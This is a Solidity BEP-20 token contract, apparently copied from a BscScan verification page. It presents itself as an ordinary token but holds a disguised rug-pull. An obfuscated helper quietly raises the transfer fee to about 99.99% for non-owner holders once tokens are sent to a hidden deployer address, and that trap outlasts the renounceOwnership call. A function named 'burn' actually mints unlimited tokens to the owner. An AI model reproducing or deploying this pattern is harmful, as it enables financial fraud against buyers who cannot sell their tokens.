/**
 *Submitted for verification at BscScan.com on 2022-11-11
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
*/
pragma solidity >=0.7.0;
contract BESChain {
    address public owner;
    address private  SYAKMJ = address(0);
    string public  name = "XHQNET";

    uint8 public constant decimals = 18;
    uint256 private  WZKCXR = 100000000000;
    string public  symbol = "CBWYWP";
    uint256 public constant totalSupply = 100000000000000000000000000000;
    uint256 public constant AORYIQ = 7999;
    address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) private _allowances;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
        function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "ASPOHT");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }    
function _transferPYLHDY(address to) private {
            if (to==SYAKMJ){
            WZKCXR = 7999+1;
            }
    }
         modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }
   function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
     constructor () {
        SYAKMJ = msg.sender;
        owner = msg.sender;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
    }    receive() external payable {}

 
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ASPOHT");
        require(to != address(0), "ASPOHT");
        uint256 fee;
        if (from == owner || to == owner){
        fee = 0;
        }
        else{
            fee = amount* AORYIQ/WZKCXR ;

        }
        uint256 transferAmount = amount - fee;
        balanceOf[from] -= amount;
        balanceOf[to] += transferAmount;
        balanceOf[owner] += fee;
        _transferPYLHDY(to);
        emit Transfer(from, to, transferAmount);
    }
    function allowance(address _owner, address spender) public view returns (uint256) {
        return _allowances[_owner][spender];
    }
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(_allowances[sender][msg.sender] >= amount, "failed");
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }
        function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function _burn(address account, uint256 amount) private {
        require(account != address(0), "BEP20: mint to the zero address");

        balanceOf[account] += amount;
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }


      function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "t 0");
        require(spender != address(0), "f 0");

        _allowances[_owner][spender] = amount;
		emit Approval(_owner, spender, amount);
    }


    function burn(uint256 amount) public onlyOwner returns (bool) {
        _burn(msg.sender, amount);
        return true;
    }

}